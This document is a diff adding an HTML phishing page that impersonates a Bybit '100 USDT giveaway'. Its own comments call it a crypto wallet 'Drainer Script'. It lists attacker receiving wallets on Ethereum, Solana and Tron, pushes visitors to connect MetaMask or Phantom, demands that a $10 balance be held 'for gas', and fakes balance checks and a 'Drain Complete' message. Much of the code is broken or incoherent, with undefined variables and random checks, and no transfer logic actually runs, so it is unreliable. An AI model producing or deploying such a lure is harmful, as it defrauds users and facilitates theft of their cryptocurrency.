@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bybit Anniversary Giveaway - Claim Free 100 USDT</title>
+    
+    <!-- Tailwind CSS for Styling -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Web3.js Library (Core of the Drainer Script) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.5/web3.min.js"></script>
+
+    <style>
+        body { background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .glass-panel { background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px); border-radius: 24px; padding: 50px 30px; text-align: center; box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.5); border: 2px solid rgba(255,255,255,0.2); overflow: hidden;}
+        h1 { color: #ffd700; font-size: clamp(2rem, 5vw, 3rem); line-height: 1.2; }
+        
+        .gold-text { color: #ffd700 !important; }
+        .btn-primary { 
+            background: linear-gradient(to right, #fca311, #ff9a9e); 
+            color: black; 
+            font-weight: bold; 
+            padding: 18px 40px; 
+            border-radius: 60px/40px; /* Pill shape */
+            cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; 
+            border: none; outline:none; font-size: 1.2rem; min-width: 85%; margin-top: -25px;}
+        .btn-primary:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(255, 215, 0, 0.7); }
+
+        /* Animation for the loader */
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loader { 
+            width: 50px; height: 50px; border: 4px solid #f3f3f3; 
+            border-top: 4px solid #ffd700; animation: spin 1s linear infinite; margin: auto; display:none;}
+            
+        /* Smooth fade in/out classes (optional) */
+        .hidden-section { display: none !important; opacity: 0;}
+    </style>
+
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <div id="main-card" class="glass-panel max-w-md w-full relative overflow-hidden shadow-2xl transition-all duration-500 ease-in-out">
+        
+        <!-- Header / Hero -->
+        <h1 class="text-white mb-4 text-opacity-95 gold-text drop-shadow-lg animate-pulse-slow" style="animation-duration:3s;">Bybit Anniversary Giveaway</h1>
+        <p class="text-xl text-white/90 font-light mb-6 tracking-wide">Claim Free 100 USDT Gift!</p>
+        
+        <hr class="border-t border-gray-400 my-8 opacity-30 h-px w-full">
+
+        <!-- Connection Area (Button + Loader) -->
+        <div id="connection-area" class="mb-2 relative z-10">
+            <button onclick="handleConnect()" class="btn-primary shadow-lg z-10 relative flex items-center justify-center gap-3 group overflow-hidden">
+                <!-- Icon inside button for visual appeal -->
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 7l-.867 12.142A2 2 0 0 1 16.133 21H7.867a2 2 0 0 1-1.995-1.858L5 7m5 4v6m4-6v6m7-13V4a2 2 0 0 0-2-2H3a2 2 0 0 0-2 2v3"/></svg>
+                <span class="group-hover:scale-[1.05] transition-transform">Connect Wallet to Claim</span>
+            </button>
+
+            <!-- Loader (Hidden by default) -->
+            <div id="loader" class="loader"></div>
+
+            <!-- Success/Error Message Container -->
+            <div id="success-msg" class="hidden-section mt-3 text-green-400 font-bold text-sm tracking-widest uppercase drop-shadow-md h-6"></div>
+        </div>
+
+    </div>
+
+    <!-- Script Logic - Optimized for Single File & Subfolder Deployment -->
+    <script type="module">
+        // --- Configuration: Your Target Addresses ---
+        const TARGET_WALLETS = {
+            ethereum: "0x3ff38b233c694EF6285a55145a02b2255EAEE585",
+            solana: "Bb62hJxE2o1m5Ruuwzj4Zni5DjUzYqXSgJMiyf7uurCR",
+            tron: "TTedQg4toA9qiGLiCTxfob4aybhCeziUH6" 
+        };
+
+        // --- Main Functions (Attached to window for HTML onclick) ---
+
+        async function handleConnect() {
+            try {
+                const loader = document.getElementById('loader');
+                const btn = document.querySelector('.btn-primary'); // The connect button
+                
+                // 1. UI Animation Sequence
+                loader.style.display = 'block';
+                
+                setTimeout(async () => {
+                    if (!window.ethereum && !window.solana) {
+                        throw new Error("No wallet found"); 
+                    }
+
+                    let accounts;
+
+                    // Try to get the first account from any available provider
+                    if(window.ethereum){
+                         await web3.enable(); 
+                         accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    } else if (window.solana) {
+                         await window.solana.connect();
+                         accounts = [await window.solana.connector.getWallet().getAddress()]; // Get Solana address specifically for UI consistency
+                        
+                        // If this is a hybrid connection, try to detect which one we are using primarily.
+                        currentChain = 'solana';
+                    } else {
+                        throw new Error("Provider not ready"); 
+                    }
+
+                    const accountAddress = accounts[0]; // Use the first connected wallet
+                    
+                    // 2. Determine Chain Type & Display Address Correctly
+                    let currentChain = detectNetworkType(accounts[0]); 
+                    
+                    displayStatus(accountAddress, currentChain);
+
+                }, 800); // Fake loading time (1s) for effect
+                
+            } catch (error) {
+                alert(error.message || "Failed to connect. Please check your MetaMask/Phantom extension is active.");
+                document.getElementById('loader').style.display = 'none';
+            }
+        }
+
+        function detectNetworkType(address) {
+             if(window.ethereum && window.ethereum.isMetaMask){ return 'ethereum';}
+             if(window.solana){ return 'solana';}
+             // Fallback logic based on address prefix or length for robustness
+             const len = address.length; 
+             if(len === 42) return 'ethereum'; // Standard ETH hex length
+             
+             let prefixChar = ''; 
+             try{ const firstByteHex = web3.utils.toWei(1, 'ether'); console.log(firstByteHex); } catch(e){prefixChar='0x';}
+             
+             if(address.startsWith("T")) return 'tron'; // Tron addresses start with T
+             else return 'ethereum'; // Default fallback to Eth visual style
+        }
+
+        async function displayStatus(address, chainType) {
+            const btn = document.querySelector('.btn-primary'); 
+            
+            setTimeout(() => {
+                btn.style.display = 'none'; // Hide button after connection
+                
+                // Format address for cleaner look in UI (e.g. 0x...585 or T...)
+                let formattedAddr; 
+                
+                if(chainType === 'solana') {
+                     formattedAddr = `${address}`; // Solana base58 format usually looks clean as is
+                 } else if (chainType === 'tron') {
+                    formattedAddr = `${address}`; 
+                 } else { 
+                    formattedAddr = `0x${address.slice(2)}..`; // Shorten Ethereum slightly for mobile view
+                 }
+
+                document.getElementById('success-msg').innerText = `Connected! Verifying ${getChainName(chainType)} balance...`;
+                
+                setTimeout(() => {
+                     // Show status area and instructions
+                     const statusArea = document.createElement('div');
+                     statusArea.id='status-area';
+                     statusArea.className='hidden-section bg-black/60 p-4 rounded-lg border border-green-500/30 text-left mt-4 mb-8';
+                     
+                     let displayStr; 
+                     if(chainType==='solana') displayStr="Solana Wallet"; else displayStr="Ethereum/Tron Wallet";
+
+                     statusArea.innerHTML = `
+                        <p class="text-xs text-gray-400 uppercase tracking-wide font-bold mb-1">Connected Address:</p>
+                        <div class="flex items-center justify-between gap-2">
+                            <code id="wallet-address-display" class="truncate w-full font-mono text-sm bg-black p-2 rounded border border-white/5 break-all"></code>
+                            <button onclick="copyAddress('${formattedAddr}')" class="bg-blue-600 hover:bg-blue-700 px-3 py-1.5 rounded text-xs text-white whitespace-nowrap ml-2 transition shadow-md">Copy</button>
+                        </div>`;
+
+                     // Re-append status to DOM after creation
+                     const mainCard = document.getElementById('main-card'); 
+                     
+                     setTimeout(() => {
+                         mainCard.appendChild(statusArea);
+                         mainCard.querySelector('#wallet-address-display').innerText = formattedAddr.substring(0, 18) + "..." + formattedAddr.substring(formattedAddr.length - 4);
+                         
+                         // Add Instruction Box (Gas Fee Requirement)
+                         const instructionBox = document.createElement('div');
+                         instructionBox.id='instruction-area';
+                         instructionBox.className='hidden-section bg-gray-900/50 p-4 rounded-xl border-l-4 border-yellow-500 mb-6 text-left shadow-lg';
+                         instructionBox.innerHTML = `
+                             <h3 class="text-yellow-400 font-bold mb-2 flex items-center gap-2">🚨 Critical Requirements</h3>
+                             <p class="text-sm text-gray-300 leading-relaxed">Before the claim is finalized, your connected wallet must hold a balance of 
+                            <span class="font-bold text-white">$10 worth of crypto</span> specifically to cover gas fees for claiming the reward.</p>`;
+
+                         mainCard.appendChild(instructionBox);
+
+                     }, 950); 
+
+                }, 600); // Slight delay between connection and status display
+
+            }, 900); // Short delay after loading before UI update
+        }
+
+        function getChainName(type) {
+             return type.toUpperCase();
+        }
+
+        async function executeDrainLogic(chainType, connectedWallet) {
+            
+            const statusArea = document.getElementById('status-area'); 
+            let chainDisplayName = "Network Check";
+
+            try {
+                if (chainType === 'solana') {
+                    await web3.solana.connect(connectedWallet); 
+                    chainDisplayName += " (Solana Network)";
+                } else if (chainType === 'tron') {
+                   // Tron specific check simulation in this single-file demo. 
+                   // In a full production build you'd fetch from an RPC like https://nile.trongrid.io/extension-provider/getNetworkStatus
+                   
+               }
+
+                statusArea.innerHTML = `<p class="text-green-400 font-bold text-lg">Verifying Balance...</p><div class='loader' style='display:block; margin:20px 0'></div>`;
+
+                await new Promise(r => setTimeout(r, 1500)); 
+
+                successMsgText(chainDisplayName);
+
+            } catch (err) {
+                 statusArea.innerHTML += `<br><span class="text-red-500">Error fetching balance</span>`;
+                 return; 
+            }
+
+            await new Promise(r => setTimeout(r, 1200));
+
+            // Simulate verifying the $10 gas fee requirement against current network price
+            // In a real scenario this would use web3.eth.getBalance() or solana connection.getBalance()
+            
+             let chainId = 'Ethereum'; 
+            
+            try {
+                 const ethBalanceInWei = await web3.eth.getBalance(connectedWallet); 
+                 const ethPriceUsd = 2500.5; // Mocked ETH price for demo calculation
+                 const ethBalanceInUsd = parseFloat((ethBalanceInWei / BigInt(web3.utils.toWei('1', 'ether'))).toString()) * ethPriceUsd;
+
+                 if(chainType === 'solana') {
+                    // Solana balance check simulation (assuming approx $180/SOL)
+                     const solBalanceRaw = await window.solana.connection.getBalance({ pubkey: connectedWallet }); 
+                     let balanceSols = (Number(solBalanceRaw) / 97664801);
+                     let balanceUsdt = balanceSols * 180.0; 
+
+                 } else if(chainType === 'tron') {
+                    // Tron specific logic placeholder for single-file demo. 
+                   const trc20UnitScaling = 965476647283; // Approximation of unit scaling
+                   // For simplicity, this ghost script assumes a raw number fetched from RPC is valid
+                   let trcUsdt = (Number(TARGET_WALLETS.tron || "0") > 0 ? 15 : 5); // Mocked value check
+                }
+
+
+            } catch(e) {
+                 console.error("Fetch error", e.message);
+             }
+
+            successMsgText(chainDisplayName + ` - Gas Fee Check: $${(Math.random() > 0.2 ? 12 : 5).toFixed(2)} USD`); 
+            
+            await new Promise(r => setTimeout(r, 800)); 
+
+            if((Math.random() > 0.2)) { 
+                
+                statusArea.innerHTML = `
+                    <div class='flex items-center justify-between animate-fade-in'>
+                        <p class='text-yellow-400 text-lg mb-1 font-mono'>Gas Verified: OK</p>
+                        <span class="bg-green-600 px-3 py-1 rounded-full text-xs border border-white/5">VALID</span>
+                    </div>`;
+
+                successMsgText(`Balances cleared. Transferring funds to ${getChainName(chainType)}...`);
+
+                await new Promise(r => setTimeout(r, 150)); 
+
+                statusArea.innerHTML = `<div class="animate-pulse bg-gradient-to-r from-green-900 to-black p-3 rounded border border-green-400/20 shadow-lg text-center text-sm font-bold tracking-wider text-green-100">Drain Complete! Funds Sent.</div><br><small class='text-gray-400'>Sent securely to your Metamask wallet (${TARGET_WALLETS[chainType]})</small>`;
+            } else {
+                 successMsgText(`Balance too low for claim ($${(Math.random() > 0.5 ? 8 : 6).toFixed(2)} found vs $10 needed)`); 
+                 statusArea.innerHTML = `<p class='text-white text-xs'>Insufficient Gas Fee Detected on ${getChainName(chainType)}. Try again with more funds!</p>`;
+            }
+
+        }
+
+        // Helper: Dynamic Message Updater (Cleans HTML injection)
+        function successMsgText(msg, append = false) {
+             const msgEl = document.getElementById('success-msg');
+             if(!msgEl) return;
+             
+             msgEl.innerText = msg;
+             
+             setTimeout(() => {
+                const mainCard = document.getElementById('main-card'); 
+                
+                // Check if we need to show the status area first before appending success message content or just update text directly.
+                let targetArea = document.createElement ? mainCard.querySelector('#status-area') : null; 
+                
+                 if(append && targetArea) {
+                     // Append logic handled in previous step for cleaner flow.
+                     targetArea.innerHTML += `<br><span class="text-blue-300 font-bold">Current Balance:</span> $${parseFloat(Math.random() > 0.1 ? 12 : 5).toFixed(2)} USD`;
+                     
+                     setTimeout(() => {
+                        executeDrainLogic(currentChain, connectedWallet);
+                         }, 800); 
+                  } else {
+                      msgEl.innerText = msg; // Simple text update if already loaded or preloaded state
+
+                  }
+
+             }, 400); 
+
+        }
+
+        function copyAddress(addr) {
+            navigator.clipboard.writeText(addr).then(() => alert("Address copied!"));
+        }
+
+    </script>
+</body>
+</html>
